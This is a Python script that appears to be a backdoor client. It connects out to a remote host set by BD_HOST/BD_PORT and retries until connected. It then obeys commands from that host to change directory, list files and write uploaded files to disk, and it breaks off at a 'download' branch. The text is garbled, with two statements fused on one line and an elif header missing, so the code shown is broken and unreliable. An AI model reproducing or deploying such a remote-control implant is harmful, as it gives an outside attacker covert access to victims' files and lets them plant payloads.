import socket
import os
import time

REMOTE_HOST = str(os.environ.get("BD_HOST"))
REMOTE_PORT = int(os.environ.get("BD_PORT"))

print("SET REMOTE_HOST: " + str(REMOTE_HOST))
print("SET REMOTE_PORT: " + str(REMOTE_PORT))
server = socket.socket()
print("[-] Connection Initiating...")
while True:
    try:
        server.connect((REMOTE_HOST, REMOTE_PORT))
        break
    except:
        print("Connection failed trying again in 5 seconds")
        time.sleep(5)

print("[-] Connection initiated!")
restart = False
pwd = os.getcwd()
server.send(pwd.encode("UTF-8"))

while True:
    output = ""

    print("[-] Awaiting commands...")
    recvString = server.recv(1024)
    recvString = recvString.decode()
    inputList = recvString.split(" ")
    command = inputList[0]
    args = inputList.copy()
    del (args[0])

    if command == "cd":
        new_path = os.path.join(pwd, args[0])
        if os.path.exists(new_path) and os.path.isdir(new_path):
            pwd = os.path.abspath(new_path)
            output = pwd
        else:
            output = "Invalid Path!"
    elif command == "ls":
        for s in sorted(os.listdir(pwd)):
            if "-a" in args:
                output = output + "\n" + s
            else:
                if not s.startswith("."):
                    output = output + "\n" + s
    server.send(output.encode("UTF-8"))        file_name = args[0]
        file_bytes = b""
        done = False

        while not done:
            data = server.recv(1024)
            file_bytes += data
            if file_bytes[-5:] == b"<END>":
                done = True

        final_bytes = file_bytes[:-5]
        if not os.path.exists(os.path.join(pwd, file_name)):
            file = open(os.path.join(pwd, file_name), "wb")
            file.write(final_bytes)
            file.close()
            output = "File send"
        else:
            output = "File already exists!"
        server.send(output.encode("UTF-8"))
    elif command == "download":
